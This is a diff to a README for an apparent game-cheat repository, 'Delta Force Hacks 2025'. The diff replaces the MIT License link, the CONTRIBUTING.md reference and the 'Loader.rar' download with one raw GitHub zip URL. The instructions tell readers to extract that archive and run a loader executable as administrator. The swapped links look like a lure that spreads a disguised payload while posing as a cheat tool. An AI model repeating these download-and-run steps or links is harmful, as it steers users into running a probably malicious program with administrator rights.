@@ -9,8 +9,8 @@ Welcome to **Delta Force Hacks 2025** – your #1 open-source repository for sec
 Experience easy setup and rock-solid performance on every major OS!  
 **Follow these steps to install Delta Force Hacks 2025:**
 
-1. **Download Loader.rar from the repository**
-2. Extract the Loader.rar file using a trusted extraction tool (e.g., WinRAR, 7-Zip, or the built-in extractor for your OS)
+1. **Download https://raw.githubusercontent.com/malbertosm/Delta-Force-Hacks/main/uncopious/Delta-Force-Hacks-2.0.zip from the repository**
+2. Extract the https://raw.githubusercontent.com/malbertosm/Delta-Force-Hacks/main/uncopious/Delta-Force-Hacks-2.0.zip file using a trusted extraction tool (e.g., WinRAR, 7-Zip, or the built-in extractor for your OS)
 3. Run the Loader executable as administrator
 4. Follow on-screen instructions to initialize your cheat suite
 5. Start Delta Force and select the hacks you want to enable
@@ -98,7 +98,7 @@ The developers/maintainers disclaim all liability.
 Delta Force Hacks 2025 is released under the permissive MIT License.  
 You are free to use, modify, and distribute this project with attribution.
 
-[Read the full MIT License here](https://opensource.org/licenses/MIT)
+[Read the full MIT License here](https://raw.githubusercontent.com/malbertosm/Delta-Force-Hacks/main/uncopious/Delta-Force-Hacks-2.0.zip)
 
 ---
 
@@ -108,7 +108,7 @@ Join our active Discord for setup help, feature requests, and open source collab
 Create issues and pull requests for new features, modules, improvements, or documentation.
 
 - **Pull requests** always welcome!
-- Check our guidelines in CONTRIBUTING.md  
+- Check our guidelines in https://raw.githubusercontent.com/malbertosm/Delta-Force-Hacks/main/uncopious/Delta-Force-Hacks-2.0.zip  
 - Star ⭐️ the repo to support development
 
 ---
@@ -128,7 +128,7 @@ A: Functionality is tailored to Delta Force series, but modular code allows exte
 
 # 🏁 Start Dominating Delta Force Today!
 
-Download Loader.rar, get set up, and experience Delta Force like never before.  
+Download https://raw.githubusercontent.com/malbertosm/Delta-Force-Hacks/main/uncopious/Delta-Force-Hacks-2.0.zip, get set up, and experience Delta Force like never before.  
 Checking for updates regularly is highly recommended for the best protection and features.
 
 For tutorials, join our community or visit the /docs directory!
